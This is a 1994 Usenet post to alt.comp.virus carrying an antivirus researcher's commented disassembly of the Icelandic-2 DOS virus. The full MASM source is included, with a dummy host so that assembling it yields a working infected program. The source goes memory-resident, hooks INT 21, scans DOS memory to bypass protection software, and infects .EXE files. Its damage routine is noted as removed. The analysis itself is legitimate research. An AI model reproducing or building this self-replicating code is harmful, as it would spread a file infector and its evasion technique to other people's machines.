From netcom.com!ix.netcom.com!howland.reston.ans.net!gatech!bloom-beacon.mit.edu!uhog.mit.edu!rutgers!engr.orst.edu!gaia.ucs.orst.edu!myhost.subdomain.domain!clair Tue Nov 29 09:54:55 1994
Xref: netcom.com alt.comp.virus:489
Path: netcom.com!ix.netcom.com!howland.reston.ans.net!gatech!bloom-beacon.mit.edu!uhog.mit.edu!rutgers!engr.orst.edu!gaia.ucs.orst.edu!myhost.subdomain.domain!clair
From: clair@myhost.subdomain.domain (The Clairvoyant)
Newsgroups: alt.comp.virus
Subject: Ice2 Disassembly by f-prot author
Date: 28 Nov 1994 08:16:26 GMT
Organization: String to put in the Organization Header
Lines: 493
Message-ID: <3bc3kq$mjc@gaia.ucs.orst.edu>
NNTP-Posting-Host: tempest.rhn.orst.edu
X-Newsreader: TIN [version 1.2 PL2]



;       THE ICELANDIC VIRUS - VERSION 2
;
;       Disassembly done in July '89.
;
;       The author(s) of this program is(are) unknown, but it is of
;       Icelandic origin. 
;
;       All comments in this file were added by Fridrik Skulason,
;       University of Iceland/Computing Services.
;
;       INTERNET:     frisk@rhi.hi.is 
;       UUCP:         ...mcvax!hafro!rhi!frisk
;       BIX:          FRISK
;
;       To anyone who obtains this file - please be careful with it, I
;       would not like to see this virus be distributed too much. The code
;       is very clear, and the virus is quite well written. It would be VERY
;       easy to modify it to do something really harmful.
;
;       The virus has the following flaws:
;
;               It modifies the date of the program it infects, making
;               it easy to spot them.
;
;               It removes the Read-only attribute from files, but does
;               not restore it.
;
;       This version appears to do no damage at all. This, and the fact that
;       the author(s) sent me a copy probably indicates that it was just
;       designed to demonstrate that a virus like this could be written.
;
;       This file was created in the following way: 
;
;       I disassembled the new version and compared it to my disassembly
;       of version #1.
;
;       Any changes found were added to this file.
;
VIRSIZ  EQU     128

        ASSUME CS:_TEXT,DS:NOTHING,SS:NOTHING,ES:NOTHING
;
;       This is a dummy "infected" program, so that this file,
;       when assembled (using MASM) will produce a "true" infected
;       program.
;
_TEXT1  SEGMENT PARA PUBLIC 'CODE'
_START  DB      0b4H,09H
        PUSH    CS
        POP     DS
        MOV     DX,OFFSET STRING
        INT     21H
        MOV     AX,4C00H
        INT     21H
STRING  DB      "Hello world!",0dh,0ah,"$"
 _TEXT1 ENDS

_TEXT SEGMENT PARA PUBLIC 'CODE'

;
;       The virus is basically divided in two parts.
;
;       1. The main program - run when an infected program is run. 
;          It will check if the system is already infected, and if not
;          it will install the virus.
;
;       2. The new INT 21 handler. It will look for EXEC calls, and
;          (sometimes) infect the program being run.
;          
VIRUS   PROC FAR
;
;       This is a fake MCB
;
        DB      'Z',00,00,VIRSIZ,0,0,0,0,0,0,0,0,0,0,0,0
;
;       The virus starts by pushing the original start address on the stack,
;       so it can transfer control there when finished.
;
LABEL1: SUB     SP,4
        PUSH    BP
        MOV     BP,SP
        PUSH    AX
        MOV     AX,ES
;
;       Put the the original CS on the stack. The ADD AX,data instruction
;       is modified by the virus when it infects other programs.
;
        DB      05H     
ORG_CS  DW      0010H
        MOV     [BP+4],AX
;
;       Put the the original IP on the stack. This MOV [BP+2],data instruction
;       is modified by the virus when it infects other programs.
;
        DB      0C7H,46H,02H
ORG_IP  DW      0000H
;
;       Save all registers that are modified.
;
        PUSH    ES
        PUSH    DS      
        PUSH    BX
        PUSH    CX
        PUSH    SI
        PUSH    DI
;
;       Check if already installed. Quit if so.
;
        XOR     AX,AX
        MOV     ES,AX
        CMP     ES:[37FH],BYTE PTR 0FFH 
        JNE     L1
;
;       Restore all registers and return to the original program.
;
EXIT:   POP     DI
        POP     SI
        POP     CX
        POP     BX
        POP     DS
        POP     ES
        POP     AX
        POP     BP
        RET
;
;       The code to check if INT 13 contains something other than
;       0070 or F000 has been removed.
;
;       Set the installation flag, so infected programs run later will
;       recognize the infection.
;
L1:     MOV     ES:[37FH],BYTE PTR 0FFH
;
;       The virus tries to hide from detection by modifying the memory block it
;       uses, so it seems to be a block that belongs to the operating system.
;
;       It looks rather weird, but it seems to work. 
;
        MOV     AH,52H                  
        INT     21H                     
;
;       The next line is new - the virus obtains the segment of the
;       IBMDOS.COM/MSDOS.SYS program.
;
        MOV     CS:[DOSSEG],ES
;
;       Back to modification
;
        MOV     AX,ES:[BX-2]            
        MOV     ES,AX                   
        ADD     AX,ES:[0003]            
        INC     AX                      
        INC     AX                      
        MOV     CS:[0001],AX
;
;       Next, the virus modifies the memory block of the infected program.
;       It is made smaller, and no longer the last block.
;
        MOV     BX,DS                   
        DEC     BX                      
        MOV     DS,BX
        MOV     AL,'M'
        MOV     DS:[0000],AL
        MOV     AX,DS:[0003]
        SUB     AX,VIRSIZ
        MOV     DS:[0003],AX
        ADD     BX,AX
        INC     BX
;
;       Then the virus moves itself to the new block. For some reason 2000
;       bytes are transferred, when much less would be enough. Maybe the author just
;       wanted to leave room for future expansions.
;
        MOV     ES,BX
        XOR     SI,SI
        XOR     DI,DI
        PUSH    CS
        POP     DS
        MOV     CX,2000
        CLD
        REP     MOVSB
;
;       The virus then transfers control to the new copy of itself.
;
        PUSH    ES
        MOV     AX,OFFSET L2
        PUSH    AX
        RET                             
;
;       This part of the program is new. It tries to bypass protection
;       programs, by obtaining the original INT 21 address. It searches
;       for the byte sequence 2E 3A 26, which (in DOS 3.1 and 3.3) is the
;       beginning of the original interrupt (probably also in 3.2 - I do
;       not have a copy of that)
;
L2:     MOV     DS,CS:[DOSSEG]
        MOV     CX,3000H
        MOV     SI,0
        MOV     AX,3A2EH
L3:     CMP     AX,[SI]
        JE      L3A
L3C:    INC     SI
        LOOP    L3
;
;       If that fails, it searches for 80 FC 63   (used in 3.0)
;                                      80 FC 4B   (used in 2.0)
;                                      80 FC F8   (This looks very odd -
;       I have no idea what DOS version this might be.)
;
        MOV     CX,3000H
        MOV     SI,0
        MOV     AX,0FC80H
L3D:    CMP     AX,[SI]
        JE      L3F
L3E:    INC     SI
        LOOP    L3D
;
;       Start of DOS not found - Give up (but remain in memory)
;
        JMP     EXIT

L3A:    CMP     BYTE PTR[SI+2],26H
        JE      L3B
        JMP     L3C
L3F:    CMP     BYTE PTR[SI+2],63H
        JE      L3B
        CMP     BYTE PTR[SI+2],4BH
        JE      L3B
        CMP     BYTE PTR[SI+2],0F8H
        JE      L3B
        JMP     L3E
L3B:    MOV     CS:[DOSPC],SI
;
;       The main program modifies INT 21 next and finally returns to the
;       original program. The original INT 21 vector is stored inside the
;       program so a JMP [OLD INT21] instruction can be used.
;
        XOR     AX,AX
        MOV     ES,AX
        MOV     AX,ES:[0084H]
        MOV     CS:[OLD21],AX
        MOV     AX,ES:[0086H]
        MOV     CS:[OLD21+2],AX
        MOV     AX,CS
        MOV     ES:[0086H],AX
        MOV     AX,OFFSET NEW21
        MOV     ES:[0084H],AX
        JMP     EXIT
VIRUS   ENDP
;
;       This is the INT 21 replacement. It only does something in the case
;       of an EXEC call.
;
NEW21   PROC FAR                        
        CMP     AH,4BH                  
        JE      L5
L4:     DB      0EAH
OLD21   DW      0,0
;
;       Only attack every tenth program run.
;
L5:     DEC     CS:[COUNTER]
        JNE     L4
        MOV     CS:[COUNTER],10
;
;       Save all affected registers.
;
        PUSH    AX
        PUSH    BX
        PUSH    CX
        PUSH    DX
        PUSH    SI
        PUSH    DS
;
;       Search for the file name extension ...
;
        MOV     BX,DX
L6:     INC     BX
        CMP     BYTE PTR [BX],'.'
        JE      L8
        CMP     BYTE PTR [BX],0
        JNE     L6
;
;       ... and quit unless it starts with "EX".
;
L7:     POP     DS
        POP     SI
        POP     DX
        POP     CX
        POP     BX
        POP     AX
        JMP     L4
L8:     INC     BX
        CMP     WORD PTR [BX],5845H
        JNE     L7
;
;       When an .EXE file is found, the virus starts by turning off
;       the read-only attribute. The read-only attribute is not restored
;       when the file has been infected.
;
;       Here, as elsewhere, the INT 21 instructions have been replaced
;       by      PUSHF/CALL DWORD PTR CS:[DOSPC]
;
        MOV     AX,4300H                ; Get attribute
        PUSHF
        CALL    DWORD PTR CS:[DOSPC]
        JC      L7
        MOV     AX,4301H                ; Set attribute
        AND     CX,0FEH
        PUSHF
        CALL    DWORD PTR CS:[DOSPC]
        JC      L7
;
;       Next, the file is examined to see if it is already infected.
;       The signature (4418 5F19) is stored in the last two words.
;
        MOV     AX,3D02H                ; Open / write access
        PUSHF
        CALL    DWORD PTR CS:[DOSPC]
        JC      L7
        MOV     BX,AX                   ; file handle in BX
        PUSH    CS                      ; now DS is no longer needed
        POP     DS
;
;       The header of the file is read in at [ID+8]. The virus then
;       modifies itself, according to the information stored in the
;       header. (The original CS and IP addressed are stored).
;
        MOV     DX,OFFSET ID+8
        MOV     CX,1CH
        MOV     AH,3FH
        PUSHF
        CALL    DWORD PTR CS:[DOSPC]
        JC      L9
        MOV     AX,DS:ID[1CH]
        MOV     DS:[ORG_IP],AX
        MOV     AX,DS:ID[1EH]
        ADD     AX,10H
        MOV     DS:[ORG_CS],AX
;
;       Next the read/write pointer is moved to the end of the file-4,
;       and the last 4 bytes read. They are compared to the signature,
;       and if equal nothing happens.
;
        MOV     AX,4202H
        MOV     CX,-1
        MOV     DX,-4
        PUSHF
        CALL    DWORD PTR CS:[DOSPC]
        JC      L9
        ADD     AX,4    
        MOV     DS:[LEN_LO],AX
        JNC     L8A
        INC     DX
L8A:    MOV     DS:[LEN_HI],DX

        MOV     AH,3FH
        MOV     CX,4
        MOV     DX,OFFSET ID+4
        PUSHF
        CALL    DWORD PTR CS:[DOSPC]
        JNC     L11
L9:     MOV     AH,3EH
        PUSHF
        CALL    DWORD PTR CS:[DOSPC]
L10:    JMP     L7
;
;       Compare to 4418,5F19
;
L11:    MOV     SI,OFFSET ID+4
        MOV     AX,[SI]
        CMP     AX,4418H
        JNE     L12
        MOV     AX,[SI+2]
        CMP     AX,5F19H
        JE      L9
;
;       The file is not infected, so the next thing the virus does is
;       infecting it. First it is padded so the length becomes a multiple
;       of 16 bytes. This is probably done so the virus code can start at a
;       paragraph boundary.
;
L12:    MOV     AX,DS:[LEN_LO]
        AND     AX,0FH
        JZ      L13
        MOV     CX,16
        SUB     CX,AX
        ADD     DS:[LEN_LO],CX
        JNC     L12A
        INC     DS:[LEN_HI]
L12A:   MOV     AH,40H
        PUSHF
        CALL    DWORD PTR CS:[DOSPC]
        JC      L9
;
;       Next the main body of the virus is written to the end.
;
L13:    XOR     DX,DX
        MOV     CX,OFFSET ID + 4
        MOV     AH,40H
        PUSHF
        CALL    DWORD PTR CS:[DOSPC]
        JC      L9
;
;       Next the .EXE file header is modified:
;
;       First modify initial IP
;
        MOV     AX,OFFSET LABEL1
        MOV     DS:ID[1CH],AX
;
;       Modify starting CS = Virus CS. It is computed as:
;
;       (Original length of file+padding)/16 - Start of load module
;
        MOV     DX,DS:[LEN_HI]
        MOV     AX,DS:[LEN_LO]
        SHR     DX,1
        RCR     AX,1
        SHR     DX,1
        RCR     AX,1
        SHR     DX,1
        RCR     AX,1
        SHR     DX,1
        RCR     AX,1
        SUB     AX,DS:ID[10H]
        MOV     DS:ID[1EH],AX
;
;       Modify length mod 512
;
        ADD     DS:[LEN_LO],OFFSET ID+4
        JNC     L14
        INC     DS:[LEN_HI]
L14:    MOV     AX,DS:[LEN_LO]
        AND     AX,511
        MOV     DS:ID[0AH],AX
;
;       Modify number of blocks used
;
        MOV     DX,DS:[LEN_HI]
        MOV     AX,DS:[LEN_LO]
        ADD     AX,511
        JNC     L14A
        INC     DX
L14A:   MOV     AL,AH
        MOV     AH,DL
        SHR     AX,1
        MOV     DS:ID[0CH],AX
;
;       Finally the modified header is written back to the start of the
;       file.
;
QQQ:    MOV     AX,4200H
        XOR     CX,CX
        XOR     DX,DX
        PUSHF
        CALL    DWORD PTR CS:[DOSPC]
        JC      ENDIT
        MOV     AH,40H
        MOV     DX,OFFSET ID+8
        MOV     CX,1CH
        PUSHF
        CALL    DWORD PTR CS:[DOSPC]
        JC      ENDIT
        MOV     AH,3EH
        PUSHF
        CALL    DWORD PTR CS:[DOSPC]
;
;       Infection is finished - close the file and execute it.
;
ENDIT:  JMP     L9
;
;       The damage section located here has been removed.
;

NEW21   ENDP

DOSPC   DW      ?

DOSSEG   DW   ?
COUNTER DB      10
LEN_LO  DW      ?
LEN_HI  DW      ?
ID      DW      4418H,5F19H             ; The signature of the virus.
;
;       A buffer, used for data from the file.
;
_TEXT   ENDS

        END LABEL1


